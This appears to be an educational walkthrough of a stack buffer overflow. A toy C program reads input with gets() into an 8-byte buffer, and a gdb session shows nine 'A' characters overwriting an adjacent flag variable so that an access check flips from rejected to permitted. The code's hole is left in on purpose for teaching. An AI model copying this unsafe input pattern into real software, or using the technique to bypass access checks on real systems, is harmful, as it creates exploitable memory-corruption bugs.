Overwrite Local Variables Using a Buffer Overflow Attack
--------------------------------------------------------

  4 void read_line()
  5 {   
  6     int flag = 0x0;
  7     char buffer[8];
  8 
  9     gets(buffer);
 10 
 11     if(flag == 0x0)
 12     {   
 13         printf("Access rejected!!\n");
 14     }
 15     else
 16     {   
 17         printf("Access permited!!\n");
 18     }
 19 }
 20 
 21 
 22 int main(int argc, char** argv)
 23 {   
 24     read_line();
 25 
 26     return 0;
 27 }


 $ ./overwrite_local_vars 
AAAAAAA
Access rejected!!

$ ./overwrite_local_vars 
AAAAAAAAA
Access permited!!


$ gdb ./overwrite_local_vars
(gdb) break 9
(gdb) break 24
(gdb) r
Breakpoint 2, main (argc=1, argv=0xbfffefa4) at overwrite_local_vars.c:24

(gdb) disass
11      if(flag == 0x0)
Dump of assembler code for function main:
   0x0804849a <+0>: push   ebp
   0x0804849b <+1>: mov    ebp,esp
=> 0x0804849d <+3>: call   0x8048460 <read_line>
   0x080484a2 <+8>: mov    eax,0x0
   0x080484a7 <+13>:    pop    ebp
   0x080484a8 <+14>:    ret    

(gdb) x/8xw $esp
0xbfffef08: 0x00000000  0x46cbe963  0x00000001  0xbfffefa4
0xbfffef18: 0xbfffefac  0xb7ffe6b0  0x00000001  0x00000001

(gdb) c
Breakpoint 1, read_line () at overwrite_local_vars.c:9

(gdb) disass
Dump of assembler code for function read_line:
   0x08048460 <+0>: push   ebp
   0x08048461 <+1>: mov    ebp,esp
   0x08048463 <+3>: sub    esp,0x10
   0x08048466 <+6>: mov    DWORD PTR [ebp-0x4],0x0
=> 0x0804846d <+13>:    lea    eax,[ebp-0xc]
   0x08048470 <+16>:    mov    DWORD PTR [esp],eax
   0x08048473 <+19>:    call   0x8048310 <gets@plt>
   0x08048478 <+24>:    cmp    DWORD PTR [ebp-0x4],0x0
   0x0804847c <+28>:    jne    0x804848c <read_line+44>
   0x0804847e <+30>:    mov    DWORD PTR [esp],0x8048544
   0x08048485 <+37>:    call   0x8048320 <puts@plt>
   0x0804848a <+42>:    jmp    0x8048498 <read_line+56>
   0x0804848c <+44>:    mov    DWORD PTR [esp],0x8048556
   0x08048493 <+51>:    call   0x8048320 <puts@plt>
   0x08048498 <+56>:    leave  
   0x08048499 <+57>:    ret    

(gdb) x/16xw $esp
0xbfffeef0: 0x46e5e3c4  0x0000002f  0x080484bb  0x00000000
0xbfffef00: 0xbfffef08  0x080484a2  0x00000000  0x46cbe963
0xbfffef10: 0x00000001  0xbfffefa4  0xbfffefac  0xb7ffe6b0
0xbfffef20: 0x00000001  0x00000001  0x00000000  0x0804a018

(gdb) s
AAAAAAAA

(gdb) x/16xw $esp
0xbfffeef0: 0xbfffeef4  0x41414141  0x41414141  0x00000000
0xbfffef00: 0xbfffef08  0x080484a2  0x00000000  0x46cbe963
0xbfffef10: 0x00000001  0xbfffefa4  0xbfffefac  0xb7ffe6b0
0xbfffef20: 0x00000001  0x00000001  0x00000000  0x0804a018

(gdb) x/w 0xbfffeefc
0xbfffeefc: 0x00000000

(gdb) c
Access rejected!!


(gdb) r
Breakpoint 2, main (argc=1, argv=0xbfffefa4) at overwrite_local_vars.c:24
(gdb) n
Breakpoint 1, read_line () at overwrite_local_vars.c:9

(gdb) n
AAAAAAAAA

(gdb) x/16xw $esp
0xbfffeef0: 0xbfffeef4  0x41414141  0x41414141  0x00000041
0xbfffef00: 0xbfffef08  0x080484a2  0x00000000  0x46cbe963
0xbfffef10: 0x00000001  0xbfffefa4  0xbfffefac  0xb7ffe6b0
0xbfffef20: 0x00000001  0x00000001  0x00000000  0x0804a018

(gdb) p flag
$4 = 65

(gdb) c
Access permited!!

